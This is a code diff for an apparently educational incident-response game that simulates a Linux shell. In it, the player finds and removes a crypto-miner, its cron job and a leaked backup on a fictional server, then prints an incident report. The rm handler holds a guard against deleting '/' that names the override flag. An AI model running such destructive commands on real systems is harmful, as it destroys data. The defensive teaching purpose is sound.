+      for (const f of rest) { const r = lookup(ctx.sess, norm(ctx.sess, f), ctx.sudo); if (r.node && r.node.t === 'd') { ctx.err(`grep: ${f}: Is a directory`); continue; } const s = readText(ctx, f, 'grep'); if (s != null) srcs.push({ name: f, s }); }
+      if (!rest.length) { if (ctx.stdin == null) { ctx.err('grep: (no file given) usage: grep WORD FILE   or   command | grep WORD'); return 2; } srcs.push({ name: '-', s: ctx.stdin }); }
+    }
+    const multi = srcs.length > 1 || rec;
+    let out = [], found = false;
+    for (const src of srcs) {
+      let c = 0;
+      const ls = lines(src.s);
+      for (let i = 0; i < ls.length; i++) {
+        re.lastIndex = 0; const hit = re.test(ls[i]);
+        if (hit === inv) continue;
+        c++; found = true;
+        if (cnt || onlyNames) continue;
+        let txt = ls[i];
+        if (ctx.tty && !inv) { re.lastIndex = 0; txt = txt.replace(re, m => C('1;31', m)); }
+        out.push((multi ? (ctx.tty ? C(35, src.name) + C(36, ':') : src.name + ':') : '') + (num ? (ctx.tty ? C(32, i + 1) + C(36, ':') : (i + 1) + ':') : '') + txt);
+      }
+      if (cnt) out.push((multi ? src.name + ':' : '') + c);
+      if (onlyNames && c) out.push(src.name);
+    }
+    if (out.length) ctx.out(out.join('\n') + '\n');
+    return found ? 0 : 1;
+  },
+  find(args, ctx) {
+    const starts = []; let i = 0;
+    while (i < args.length && !args[i].startsWith('-')) starts.push(args[i++]);
+    if (!starts.length) starts.push('.');
+    const tests = [];
+    while (i < args.length) {
+      const a = args[i++], v = args[i++];
+      if (a === '-name' || a === '-iname') { if (v == null) { ctx.err(`find: missing argument to '${a}'`); return 1; } const re = new RegExp(globRe(v).source, a === '-iname' ? 'i' : ''); tests.push((p, nd) => re.test(p.split('/').pop())); }
+      else if (a === '-type') { tests.push((p, nd) => (v === 'd') === (nd.t === 'd')); }
+      else if (a === '-maxdepth' || a === '-size' || a === '-user' || a === '-perm') { if (a === '-user') tests.push((p, nd) => ownerName(nd) === v); }
+      else { ctx.err(`find: unknown predicate '${a}'`); return 1; }
+    }
+    const out = [];
+    for (const st of starts) {
+      const abs = norm(ctx.sess, st), r = lookup(ctx.sess, abs, ctx.sudo);
+      if (r.err) { ctx.err(`find: '${st}': Permission denied`); continue; }
+      if (!r.node) { ctx.err(`find: '${st}': No such file or directory`); continue; }
+      const disp = p => st === '.' ? '.' + p.slice(abs === '/' ? 0 : abs.length) : (st.replace(/\/$/, '') || '/') + p.slice(abs.length);
+      walk(ctx.sess, abs, r.node, (p, nd) => { if (tests.every(t => t(p, nd))) out.push(disp(p).replace(/^\/\//, '/')); }, ctx.sudo, d => ctx.err(`find: '${disp(d)}': Permission denied`));
+    }
+    if (out.length) ctx.out(out.join('\n') + '\n');
+  },
+  wc(args, ctx) {
+    const { flags, rest } = parseOpts(args);
+    const ins = getInput(ctx, rest, 'wc'); if (!ins) return 1;
+    const any = flags.has('l') || flags.has('w') || flags.has('c');
+    const row = (s, name) => {
+      const v = []; if (!any || flags.has('l')) v.push((s.match(/\n/g) || []).length); if (!any || flags.has('w')) v.push(s.split(/\s+/).filter(Boolean).length); if (!any || flags.has('c')) v.push(utf8(s).length);
+      return (v.length === 1 && name === '-' ? String(v[0]) : v.map(x => String(x).padStart(any ? 1 : 7)).join(' ')) + (name === '-' ? '' : ' ' + name);
+    };
+    ctx.out(ins.map(x => row(x.s, x.name)).join('\n') + '\n');
+  },
+  sort(args, ctx) {
+    const { flags, rest } = parseOpts(args);
+    const ins = getInput(ctx, rest, 'sort'); if (!ins) return 1;
+    let ls = lines(ins.map(x => x.s).join(''));
+    ls.sort(flags.has('n') ? (a, b) => parseFloat(a) - parseFloat(b) || a.localeCompare(b) : (a, b) => a < b ? -1 : a > b ? 1 : 0);
+    if (flags.has('r')) ls.reverse();
+    if (flags.has('u')) ls = ls.filter((l, i) => i === 0 || l !== ls[i - 1]);
+    if (ls.length) ctx.out(ls.join('\n') + '\n');
+  },
+  uniq(args, ctx) {
+    const { flags, rest } = parseOpts(args);
+    const ins = getInput(ctx, rest, 'uniq'); if (!ins) return 1;
+    const ls = lines(ins.map(x => x.s).join('')), out = [];
+    for (const l of ls) { if (out.length && out[out.length - 1][0] === l) out[out.length - 1][1]++; else out.push([l, 1]); }
+    if (out.length) ctx.out(out.map(([l, n]) => flags.has('c') ? String(n).padStart(7) + ' ' + l : l).join('\n') + '\n');
+  },
+  cut(args, ctx) {
+    const { vals, rest } = parseOpts(args, 'df');
+    if (!vals.f) { ctx.err('cut: you must specify a list of fields, e.g. cut -d" " -f1'); return 1; }
+    const d = vals.d == null ? '\t' : vals.d || ' ';
+    const want = []; for (const part of String(vals.f).split(',')) { const [a, b] = part.split('-'); const lo = +a || 1, hi = b === undefined ? lo : (b === '' ? 999 : +b); for (let k = lo; k <= hi; k++) want.push(k); }
+    const ins = getInput(ctx, rest, 'cut'); if (!ins) return 1;
+    const ls = lines(ins.map(x => x.s).join(''));
+    ctx.out(ls.map(l => { const p = l.split(d); return p.length === 1 ? l : want.filter(k => k <= p.length).map(k => p[k - 1]).join(d); }).join('\n') + '\n');
+  },
+  awk(args, ctx) {
+    const { vals, rest } = parseOpts(args, 'F');
+    const prog = rest.shift();
+    const m = prog && /^\{\s*print\s*(.*?)\s*\}$/.exec(prog.trim());
+    if (!m) { ctx.err("awk: this mini awk understands '{print $1}', '{print $1, $3}' and '{print $NF}'"); return 2; }
+    const ins = getInput(ctx, rest, 'awk'); if (!ins) return 1;
+    const parts = m[1] ? m[1].split(',').map(s => s.trim()) : ['$0'];
+    const ls = lines(ins.map(x => x.s).join(''));
+    ctx.out(ls.map(l => { const f = vals.F ? l.split(vals.F) : l.trim().split(/\s+/); const NF = f.length;
+      return parts.map(p => { const mm = /^\$(?:\(NF-(\d+)\)|(NF)|(\d+))$/.exec(p); if (!mm) return p.replace(/^"|"$/g, ''); if (mm[1]) return f[NF - 1 - +mm[1]] ?? ''; if (mm[2]) return f[NF - 1]; return +mm[3] === 0 ? l : (f[+mm[3] - 1] ?? ''); }).join(' '); }).join('\n') + '\n');
+  },
+  tr(args, ctx) {
+    const { flags, rest } = parseOpts(args);
+    if (ctx.stdin == null) { ctx.err("tr: tr reads from a pipe or <. Example: tr 'a-z' 'A-Z' < file.txt   or   echo hi | tr a-z A-Z"); return 1; }
+    const exp = s => { const o = []; s = s.replace(/\[:upper:\]/g, 'A-Z').replace(/\[:lower:\]/g, 'a-z').replace(/\[:digit:\]/g, '0-9'); for (let i = 0; i < s.length; i++) { if (s[i + 1] === '-' && i + 2 < s.length) { for (let c = s.charCodeAt(i); c <= s.charCodeAt(i + 2); c++) o.push(String.fromCharCode(c)); i += 2; } else o.push(s[i]); } return o; };
+    if (!rest[0]) { ctx.err('tr: missing operand'); return 1; }
+    const a = exp(rest[0]);
+    if (flags.has('d')) { ctx.out([...ctx.stdin].filter(c => !a.includes(c)).join('')); return; }
+    if (!rest[1]) { ctx.err(`tr: missing operand after '${rest[0]}'`); return 1; }
+    const b = exp(rest[1]), map = {}; a.forEach((c, i) => map[c] = b[Math.min(i, b.length - 1)]);
+    ctx.out([...ctx.stdin].map(c => map[c] ?? c).join(''));
+  },
+  base64(args, ctx) {
+    const { flags, rest } = parseOpts(args);
+    const ins = getInput(ctx, rest, 'base64'); if (!ins) return 1;
+    const s = ins.map(x => x.s).join('');
+    if (flags.has('d') || flags.has('decode')) { try { ctx.out(fromB64(s)); } catch (e) { ctx.err('base64: invalid input'); return 1; } }
+    else ctx.out(toB64(s).replace(/(.{76})/g, '$1\n') + '\n');
+  },
+  xxd(args, ctx) {
+    const { flags, rest } = parseOpts(args);
+    const ins = getInput(ctx, rest, 'xxd'); if (!ins) return 1;
+    const s = ins.map(x => x.s).join('');
+    if (flags.has('r')) { const h = s.replace(/[^0-9a-f]/gi, ''); let o = ''; for (let i = 0; i + 1 < h.length; i += 2) o += String.fromCharCode(parseInt(h.slice(i, i + 2), 16)); try { o = decodeURIComponent(escape(o)); } catch (e) {} ctx.out(o); return; }
+    const b = utf8(s);
+    if (flags.has('p')) { ctx.out(toHex(s).replace(/(.{60})/g, '$1\n') + '\n'); return; }
+    const out = [];
+    for (let i = 0; i < b.length; i += 16) {
+      const ch = b.slice(i, i + 16); let hex = '';
+      for (let j = 0; j < 16; j++) { hex += j < ch.length ? ch.charCodeAt(j).toString(16).padStart(2, '0') : '  '; if (j % 2) hex += ' '; }
+      out.push(i.toString(16).padStart(8, '0') + ': ' + hex + ' ' + ch.replace(/[^\x20-\x7e]/g, '.'));
+    }
+    ctx.out(out.join('\n') + '\n');
+  },
+  md5sum(args, ctx) { return hashCmd(args, ctx, md5, 'md5sum'); },
+  sha256sum(args, ctx) { return hashCmd(args, ctx, sha256, 'sha256sum'); },
+  file(args, ctx) {
+    for (const f of args) { const r = lookup(ctx.sess, norm(ctx.sess, f), ctx.sudo); if (!r.node) { ctx.out(`${f}: cannot open \`${f}' (No such file or directory)`); continue; } ctx.out(`${f}: ${r.node.t === 'd' ? 'directory' : /^(\x7fELF|ELF64)/.test(r.node.s) ? 'ELF 64-bit LSB executable, x86-64' : /^[A-Za-z0-9+/=\s]+$/.test(r.node.s) && r.node.s.length > 20 ? 'ASCII text (looks like Base64)' : 'ASCII text'}`); }
+  },
+  tree(args, ctx) {
+    const abs = norm(ctx.sess, args[0] || '.'), r = lookup(ctx.sess, abs, ctx.sudo);
+    if (!r.node || r.node.t !== 'd') { ctx.err(`${args[0] || '.'} [error opening dir]`); return 1; }
+    const out = [args[0] || '.']; let nd = 0, nf = 0;
+    const rec = (node, pre) => { const ks = Object.keys(node.c).filter(k => !k.startsWith('.')).sort(); ks.forEach((k, i) => { const last = i === ks.length - 1, c = node.c[k]; out.push(pre + (last ? '└── ' : '├── ') + (ctx.tty ? colorName(k, c) : k)); if (c.t === 'd') { nd++; if (!(c.deny && !ctx.sudo)) rec(c, pre + (last ? '    ' : '│   ')); } else nf++; }); };
+    rec(r.node, ''); out.push('', `${nd} directories, ${nf} files`); ctx.out(out.join('\n') + '\n');
+  },
+  mkdir(args, ctx) { return touchMk(args, ctx, 'd'); },
+  touch(args, ctx) { return touchMk(args, ctx, 'f'); },
+  rm(args, ctx) {
+    const { flags, rest } = parseOpts(args);
+    if (!rest.length) { ctx.err('rm: missing operand'); return 1; }
+    let code = 0;
+    for (const f of rest) {
+      const abs = norm(ctx.sess, f);
+      if (abs === '/' ) { ctx.err("rm: it is dangerous to operate recursively on '/'\nrm: use --no-preserve-root to override this failsafe  (nice try 😅)"); code = 1; continue; }
+      const [dir, name] = splitPath(abs), pr = lookup(ctx.sess, dir, ctx.sudo), r = lookup(ctx.sess, abs, ctx.sudo);
+      if (!r.node) { if (!flags.has('f')) { ctx.err(`rm: cannot remove '${f}': No such file or directory`); code = 1; } continue; }
+      if (r.node.t === 'd' && !flags.has('r') && !flags.has('R')) { ctx.err(`rm: cannot remove '${f}': Is a directory  (use rm -r for folders)`); code = 1; continue; }
+      if (!pr.node || !canWrite(ctx.sess, pr.node, ctx.sudo) || (r.node.own !== ctx.sess.user && r.node.own !== 'user' && !ctx.sudo)) { ctx.err(`rm: cannot remove '${f}': Permission denied`); if (ctx.sess.host === 'lumen-web') tipSudo(); code = 1; continue; }
+      if (ctx.sess.host === 'nullbox' && abs.startsWith(ctx.sess.home + '/cases')) { ctx.err(`rm: cannot remove '${f}': this is case evidence, and NULLSEC policy says evidence is read-only 🔒`); code = 1; continue; }
+      delete pr.node.c[name];
+      if (ctx.sess.host === 'lumen-web') {
+        if (abs === '/etc/cron.d/sys-update') LW().cron = true;
+        if (abs === '/tmp/.cache') LW().cache = true;
+        if (abs === '/var/www/html/site_backup.bak') LW().backup = true;
+        save();
+      }
+    }
+    return code;
+  },
+  cp(args, ctx) { ctx.err('cp: (not needed for this case. Copying evidence is done for you)'); return 1; },
+  mv(args, ctx) { ctx.err('mv: (not needed for this case)'); return 1; },
+  chmod(args, ctx) {
+    const [mode, ...files] = args;
+    if (!mode || !files.length) { ctx.err("chmod: missing operand. Example: chmod 600 secret.txt"); return 1; }
+    for (const f of files) {
+      const abs = norm(ctx.sess, f), r = lookup(ctx.sess, abs, ctx.sudo);
+      if (!r.node) { ctx.err(`chmod: cannot access '${f}': No such file or directory`); return 1; }
+      if (!ctx.sudo && ownerName(r.node) !== ctx.sess.user) { ctx.err(`chmod: changing permissions of '${f}': Operation not permitted`); if (ctx.sess.host === 'lumen-web') tipSudo(); return 1; }
+      if (/^[0-7]{3}$/.test(mode)) r.node.mode = mode;
+      else if (/^[ugoa]*[+-][rwx]+$/.test(mode)) { const m = [...r.node.mode].map(Number), who = mode.match(/^[ugoa]*/)[0] || 'a', add = mode.includes('+'), bits = mode.split(/[+-]/)[1]; const v = (bits.includes('r') ? 4 : 0) + (bits.includes('w') ? 2 : 0) + (bits.includes('x') ? 1 : 0); [['u', 0], ['g', 1], ['o', 2]].forEach(([w, i]) => { if (who.includes(w) || who.includes('a')) m[i] = add ? m[i] | v : m[i] & ~v; }); r.node.mode = m.join(''); }
+      else { ctx.err(`chmod: invalid mode: '${mode}'`); return 1; }
+      if (ctx.sess.host === 'lumen-web' && abs === '/var/www/.env') { LW().env = r.node.mode === '600' || r.node.mode === '400' || r.node.mode === '640'; save(); }
+    }
+  },
+  sudo(args, ctx) {
+    if (!args.length) { ctx.err('usage: sudo <command>'); return 1; }
+    if (ctx.sess.host !== 'lumen-web') { ctx.err(`[sudo] password for ${ctx.sess.user}: \n${ctx.sess.user} is not in the sudoers file.  This incident will be reported.`); ghostOnce('sudo-local', "😂 You're not an admin on your own laptop. IT doesn't trust anyone. `sudo` will work on Lumen's server later."); return 1; }
+    if (args[0] === '-l') { ctx.out('User analyst may run the following commands on lumen-web:\n    (ALL : ALL) ALL'); return 0; }
+    if (args[0] === 'su' || args[0] === '-i' || args[0] === '-s') { ctx.out(C(90, '(NULLSEC policy: no root shells. Use sudo one command at a time, so every action is logged.)')); return 1; }
+    const sub = Object.assign({}, ctx, { sudo: true });
+    return execArgv(args, sub);
+  },
+  last(args, ctx) {
+    if (ctx.sess.host !== 'lumen-web') { ctx.out(`${S.user.padEnd(9)} pts/0        192.168.1.42     Thu Mar 14 08:02   still logged in\nreboot   system boot  6.5.0-nullsec    Thu Mar 14 08:00   still running\n\nwtmp begins Thu Mar 14 08:00:00 2024`); return; }
+    let rows = [
+      ['analyst', 'pts/0', '10.20.0.88', 'Fri Mar 15 09:30', '  still logged in'],
+      ['admin', 'pts/1', '10.20.0.2', 'Thu Mar 14 17:02', '- 17:40  (00:38)'],
+      ['svc_depl', 'pts/0', ATTACKER, 'Thu Mar 14 02:11', '- 02:19  (00:08)'],
+      ['admin', 'pts/0', '10.20.0.2', 'Wed Mar 13 11:20', '- 12:05  (00:45)'],
+      ['reboot', 'system boot', '5.15.0-91', 'Mon Mar 11 06:00', '  still running']];
+    if (args[0]) rows = rows.filter(r => r[0].startsWith(args[0].slice(0, 8)));
+    ctx.out(rows.map(r => `${r[0].padEnd(9)}${r[1].padEnd(13)}${r[2].padEnd(17)}${r[3]}${r[4]}`).join('\n') + '\n\nwtmp begins Mon Mar 11 06:00:01 2024\n');
+  },
+  crontab(args, ctx) { if (args[0] === '-l') { ctx.out(`no crontab for ${ctx.sess.user}`); return 1; } ctx.err('crontab: (only "crontab -l" is available here)'); return 1; },
+  ps(args, ctx) {
+    const p = procs(ctx.sess);
+    ctx.out('USER         PID %CPU %MEM TTY      STAT START   COMMAND\n' + p.map(r => `${String(r[0]).slice(0, 8).padEnd(8)}${r[0].length > 8 ? '+' : ' '}${String(r[1]).padStart(6)} ${r[2].toFixed(1).padStart(4)} ${r[3].toFixed(1).padStart(4)} ${r[4].padEnd(8)} ${r[5].padEnd(4)} ${r[6].padEnd(7)} ${r[7]}`).join('\n') + `\n${ctx.sess.user.padEnd(9)}${String(5090).padStart(6)}  0.0  0.0 pts/0    R+   09:41   ps ${args.join(' ')}\n`);
+  },
+  top(args, ctx) { ctx.out(C(90, '(top is live and fullscreen. Here is a snapshot instead, like ps aux sorted by CPU)')); return CMDS.ps(args, ctx); },
+  kill(args, ctx) {
+    const pid = +args.filter(a => !a.startsWith('-'))[0];
+    if (!pid) { ctx.err('kill: usage: kill [-9] PID'); return 1; }
+    const p = procs(ctx.sess).find(r => r[1] === pid);
+    if (!p) { ctx.err(`-bash: kill: (${pid}) - No such process`); return 1; }
+    if (p[0] !== ctx.sess.user && !ctx.sudo) { ctx.err(`-bash: kill: (${pid}) - Operation not permitted`); if (ctx.sess.host === 'lumen-web') tipSudo(); return 1; }
+    if (pid === MINER_PID && ctx.sess.host === 'lumen-web') { LW().killed = true; save(); updateMeter(); return 0; }
+    ctx.err(`kill: (${pid}) - let's not kill that one, it's needed by the system 🙂`); return 1;
+  },
+  ss(args, ctx) {
+    const { flags } = parseOpts(args);
+    const pr = flags.has('p'), listen = flags.has('l');
+    let rows = ctx.sess.host === 'lumen-web'
+      ? [['LISTEN', '0.0.0.0:22', '0.0.0.0:*', 'sshd', 612], ['LISTEN', '0.0.0.0:80', '0.0.0.0:*', 'nginx', 701], ['ESTAB', '10.20.0.5:22', '10.20.0.88:51734', 'sshd', 5010]]
+      : [['LISTEN', '127.0.0.1:631', '0.0.0.0:*', 'cupsd', 512], ['ESTAB', '192.168.1.42:51022', '10.20.0.5:22', 'ssh', 1400]];
+    if (ctx.sess.host === 'lumen-web' && !LW().killed) rows.push(['ESTAB', '10.20.0.5:51544', `${C2}:3333`, 'kworkerd', MINER_PID]);
+    if (ctx.sess.host === 'nullbox' && sessions.length < 2) rows.pop();
+    rows = rows.filter(r => listen ? r[0] === 'LISTEN' : (flags.has('a') || r[0] !== 'LISTEN'));
+    ctx.out('State   Recv-Q Send-Q  Local Address:Port      Peer Address:Port   ' + (pr ? 'Process' : '') + '\n' + rows.map(r => `${r[0].padEnd(8)}0      0       ${r[1].padEnd(24)}${r[2].padEnd(20)}${pr ? `users:(("${r[3]}",pid=${r[4]},fd=3))` : ''}`).join('\n') + '\n');
+    if (!pr && ctx.sess.host === 'lumen-web') ctx.out(C(90, '(add -p to see which program owns each connection; the -p details may need sudo on real systems)'));
+  },
+  netstat(args, ctx) { ctx.out(C(90, 'netstat is the old tool. Its modern replacement is ss:')); return CMDS.ss(args.length ? args : ['-tnp'], ctx); },
+  ip(args, ctx) {
+    const sub = args[0] || '';
+    if (/^a(ddr(ess)?)?$/.test(sub) || sub === '') {
+      if (ctx.sess.host === 'lumen-web') { ctx.out(`1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 state UNKNOWN\n    inet 127.0.0.1/8 scope host lo\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 state UP\n    link/ether 52:54:00:1a:2b:3c brd ff:ff:ff:ff:ff:ff\n    inet 10.20.0.5/24 brd 10.20.0.255 scope global eth0\n`); return; }
+      ctx.out(`1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n2: wlan0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP\n    link/ether 3c:22:fb:9a:41:07 brd ff:ff:ff:ff:ff:ff\n    inet ${ctx.tty ? C('1;33', '192.168.1.42') : '192.168.1.42'}/24 brd 192.168.1.255 scope global dynamic wlan0\n`); return;
+    }
+    if (/^n(eigh(bou?r)?)?$/.test(sub)) {
+      if (ctx.sess.host === 'lumen-web') { ctx.out('10.20.0.1 dev eth0 lladdr 52:54:00:00:00:01 REACHABLE\n10.20.0.2 dev eth0 lladdr 52:54:00:00:00:02 STALE\n'); return; }
+      ctx.out('192.168.1.1 dev wlan0 lladdr 9c:53:22:11:aa:01 REACHABLE\n192.168.1.20 dev wlan0 lladdr 3c:22:fb:10:7e:33 STALE\n192.168.1.31 dev wlan0 lladdr 00:1b:a9:44:0c:9e REACHABLE\n192.168.1.77 dev wlan0 lladdr b8:27:eb:5d:12:c4 REACHABLE\n'); return;
+    }
+    if (/^r(oute)?$/.test(sub)) { ctx.out(ctx.sess.host === 'lumen-web' ? 'default via 10.20.0.1 dev eth0\n10.20.0.0/24 dev eth0 proto kernel scope link src 10.20.0.5\n' : 'default via 192.168.1.1 dev wlan0 proto dhcp metric 600\n192.168.1.0/24 dev wlan0 proto kernel scope link src 192.168.1.42\n'); return; }
+    ctx.err(`Object "${sub}" is unknown, try "ip help".  (try: ip a, ip neigh, ip route)`); return 255;
+  },
+  async ping(args, ctx) {
+    const { vals, rest } = parseOpts(args, 'cWiw');
+    const target = rest[0];
+    if (!target) { ctx.err('ping: usage error: Destination address required'); return 1; }
+    const ip = /^\d+\.\d+\.\d+\.\d+$/.test(target) ? target : HOSTS[target];
+    if (!ip) { ctx.err(`ping: ${target}: Temporary failure in name resolution`); if (/\./.test(target)) ctx.err(C(90, '  (this laptop is sandboxed: no internet in the simulation)')); return 2; }
+    const count = vals.c ? Math.max(1, Math.min(20, +vals.c || 4)) : Infinity;
+    const base = ALIVE[ip];
+    ctx.out(`PING ${target} (${ip}) 56(84) bytes of data.`);
+    let sent = 0, recv = 0; const times = [];
+    const summary = () => { const loss = sent ? Math.round((sent - recv) / sent * 100) : 0; let s = `\n--- ${target} ping statistics ---\n${sent} packets transmitted, ${recv} received, ${loss}% packet loss, time ${sent * 1000}ms`; if (times.length) s += `\nrtt min/avg/max/mdev = ${Math.min(...times).toFixed(3)}/${(times.reduce((a, b) => a + b, 0) / times.length).toFixed(3)}/${Math.max(...times).toFixed(3)}/0.412 ms`; return s; };
+    try {
+      while (sent < count) {
+        await ctx.sleep(sent ? 700 : 300); sent++;
+        if (base == null) { if (sent % 3 === 0) ctx.out(`From 192.168.1.42 icmp_seq=${sent} Destination Host Unreachable`); }
+        else { const t = base * (0.8 + Math.random() * 0.5); times.push(t); recv++; ctx.out(`64 bytes from ${ip}: icmp_seq=${sent} ttl=64 time=${t.toFixed(base < 1 ? 3 : 1)} ms`); }
+        if (count === Infinity && sent === 6) ctx.out(C(90, '  (ping runs forever on Linux. Press Ctrl+C to stop it)'));
+        if (sent >= 60) break;
+      }
+    } catch (e) { if (e instanceof Abort) { abortFlag = false; ctx.out('^C' + summary()); return 0; } throw e; }
+    ctx.out(summary().slice(1));
+    return recv ? 0 : 1;
+  },
+  async ssh(args, ctx) {
+    const { rest } = parseOpts(args, 'pil');
+    const tgt = rest[0];
+    if (!tgt) { ctx.err('usage: ssh [-p port] user@hostname'); return 255; }
+    let [user, host] = tgt.includes('@') ? tgt.split('@') : [ctx.sess.user, tgt];
+    if (ctx.sess.host === 'lumen-web') { ctx.err("You're already on lumen-web. Type exit first to go back to your laptop."); return 1; }
+    const ip = HOSTS[host] || host;
+    if (ip !== '10.20.0.5') { await ctx.sleep(1200); ctx.err(`ssh: connect to host ${host} port 22: ${HOSTS[host] || /^\d/.test(host) ? 'Connection refused' : 'Could not resolve hostname ' + host + ': Name or service not known'}`); return 255; }
+    if (S.mi < MISSIONS.findIndex(m => m.title === 'On Scene')) { await ctx.sleep(800); ctx.err(`ssh: connect to host ${host} port 22: Connection timed out`); ctx.err(C(90, "  (we don't have access to Lumen's server yet. Keep going with your missions!)")); return 255; }
+    await ctx.sleep(500);
+    if (user !== 'analyst') { ctx.err(`${user}@${host}: Permission denied (publickey).`); ctx.err(C(90, '  (your key is set up for the user "analyst". Try: ssh analyst@lumen-web)')); return 255; }
+    ctx.out(`Authenticated to ${host} ([10.20.0.5]:22) using "publickey" (~/.ssh/id_ed25519).`);
+    await ctx.sleep(400);
+    if (!LUMEN) LUMEN = buildLumen();
+    sessions.push({ host: 'lumen-web', user: 'analyst', fs: LUMEN, home: '/home/analyst', cwd: '/home/analyst', prev: null });
+    ctx.out(`\n${C('1;31', '*** AUTHORIZED ACCESS ONLY: Lumen Robotics ***')}\nAll activity on this system is logged.\n\nWelcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-91-generic x86_64)\n  System load:  ${LW().killed ? '0.21' : C('1;31', '3.97')}     Users logged in: 1\n\nLast login: Thu Mar 14 17:02:11 2024 from 10.20.0.2`);
+    updateMeter();
+  },
+  ufw(args, ctx) {
+    if (!ctx.sudo) { ctx.err('ERROR: You need to be root to run this script'); if (ctx.sess.host === 'lumen-web') tipSudo(); return 1; }
+    if (args[0] === 'status') { ctx.out('Status: active\n\nTo                         Action      From\n--                         ------      ----\n22/tcp                     ALLOW       Anywhere\n80/tcp                     ALLOW       Anywhere' + (LW().ufw ? `\nAnywhere                   DENY        ${ATTACKER}` : '') + '\n'); return; }
+    if (args[0] === 'deny' && args[1] === 'from' && args[2]) {
+      if (ctx.sess.host === 'lumen-web' && args[2] === ATTACKER) { LW().ufw = true; save(); }
+      if (args[2].startsWith('10.20.0.88')) { ctx.err("WARNING: that's YOUR IP. Blocking it would lock you out! (Real admins have done this... 😬)"); return 1; }
+      ctx.out('Rule added'); return;
+    }
+    ctx.err('Usage: ufw deny from <IP>   |   ufw status'); return 1;
+  },
+  passwd(args, ctx) {
+    if (args[0] === '-l' && args[1]) {
+      if (!ctx.sudo) { ctx.err(`passwd: You may not view or modify password information for ${args[1]}.`); return 1; }
+      if (ctx.sess.host === 'lumen-web' && args[1] === 'svc_deploy') { LW().locked = true; save(); }
+      ctx.out('passwd: password expiry information changed.'); return;
+    }
+    ctx.err(C(90, '(changing passwords is switched off in this simulation. To lock an account: sudo passwd -l <user>)')); return 1;
+  },
+  neofetch(args, ctx) {
+    const a = C('1;35', '   ▄▄▄▄▄▄▄   '), u = ctx.sess.user + '@' + ctx.sess.host;
+    ctx.out([`${a}  ${C('1;36', u)}`, `${C('1;35', '  █ ◢■■■◣ █  ')}  ${'-'.repeat(u.length)}`, `${C('1;35', '  █ ■ ▲ ■ █  ')}  ${C(36, 'OS')}: ${ctx.sess.host === 'lumen-web' ? 'Ubuntu 22.04.4 LTS' : 'NullBox Linux 1.0 (Night Owl)'}`, `${C('1;35', '  █ ◥■■■◤ █  ')}  ${C(36, 'Shell')}: bash 5.2`, `${C('1;35', '   ▀▀▀▀▀▀▀   ')}  ${C(36, 'Rank')}: ${rankOf(S.xp)[1]}`, `               ${C(36, 'XP')}: ${S.xp}`].join('\n'));
+  },
+  hint(args, ctx) { showHint(); },
+  submit(args, ctx) {
+    if (!args.length) { ctx.err('usage: submit <answer>'); return 1; }
+    submitAnswer(args.join(' '));
+  },
+  report(args, ctx) {
+    if (ctx.sess.host !== 'lumen-web' || !(LW().killed && LW().cron && LW().cache && LW().ufw && LW().locked && LW().backup && LW().env)) { ctx.out(C(90, '(The report is ready once the Lumen case is fully contained and hardened. Check your Missions window.)')); return 1; }
+    const ok = C('1;32', '✔');
+    ctx.out([C('1;35', '╔══════════════════════════════════════════════════════════╗'), C('1;35', '║') + C(1, '  NULLSEC INCIDENT REPORT · Lumen Robotics · lumen-web'.padEnd(58)) + C('1;35', '║'), C('1;35', '╚══════════════════════════════════════════════════════════╝'),
+      `Analyst: ${S.handle}        Severity: ${C('1;31', 'HIGH')}        Status: ${C('1;32', 'RESOLVED')}`, '',
+      C(36, 'WHAT HAPPENED'),
+      `  1. ${ATTACKER} scanned the website and downloaded a forgotten backup`, '     file (site_backup.bak) that contained the svc_deploy login.',
+      `  2. They tried ${FAIL_ATTACKER} logins over SSH, then logged in as svc_deploy.`,
+      `  3. They installed a crypto-miner (BLACKFERN crew) in /tmp/.cache,`, `     added a cron job to restart it every 5 minutes and modified nginx.`, '',
+      C(36, 'WHAT WE DID'),
+      `  ${ok} stopped the miner process (PID ${MINER_PID})`, `  ${ok} removed the cron job and the hidden folder`, `  ${ok} blocked ${ATTACKER} in the firewall`, `  ${ok} locked the svc_deploy account`, `  ${ok} deleted the public backup file`, `  ${ok} fixed permissions on /var/www/.env (now 600)`, '',
+      C(36, 'RECOMMENDATIONS'),
+      '  • Reinstall nginx from the official source (its hash did not match)', '  • Use SSH keys instead of passwords, and turn on fail2ban', '  • Never store backups inside the public web folder', '  • Send logs to a separate server so attackers can\'t erase them'].join('\n'));
+  },
+};
+const EXTRA_MAN = { echo: 'print text. -n = no newline at the end', head: 'show the first lines of a file (head -n 5 file)', tail: 'show the last lines of a file (tail -n 5 file)', sort: 'sort lines. -n numbers, -r reverse', uniq: 'merge repeated lines next to each other. -c counts them (sort first!)', cut: 'cut columns: cut -d" " -f1 file', awk: "pattern language. Here: awk '{print $1}' prints column 1", clear: 'clear the screen (or press Ctrl+L)', history: 'list commands you typed', whoami: 'print your user name', hostname: 'print the name of this computer', file: 'guess what kind of file something is', tree: 'show folders as a tree', mkdir: 'make a folder', touch: 'create an empty file', exit: 'log out of a remote machine', report: 'game command: write the incident report', hint: 'game command: get a hint', submit: 'game command: send an answer' };
+const TAB_CMDS = Object.keys(CMDS).concat(Object.keys(ALIAS)).sort();
+async function headTail(args, ctx, which) {
+  args = args.map(a => /^-\d+$/.test(a) ? '-n' + a.slice(1) : a);
+  const { vals, rest } = parseOpts(args, 'nc');
+  const n = vals.n != null ? Math.abs(parseInt(vals.n, 10)) : 10;
+  const ins = getInput(ctx, rest, which); if (!ins) return 1;
+  const out = ins.map((x, i) => { const ls = lines(x.s); const sel = which === 'head' ? ls.slice(0, n) : ls.slice(Math.max(0, ls.length - n)); return (ins.length > 1 ? `${i ? '\n' : ''}==> ${x.name} <==\n` : '') + sel.join('\n'); });
+  ctx.out(out.join('\n') + '\n');
+}
+function hashCmd(args, ctx, fn, name) {
+  const { flags, rest } = parseOpts(args);
+  if (flags.has('c')) {
+    const s = readText(ctx, rest[0] || '', name); if (s == null) return 1;
+    let bad = 0;
+    for (const ln of lines(s)) {
+      const m = /^([0-9a-f]+)\s+\*?(.+)$/.exec(ln); if (!m) continue;
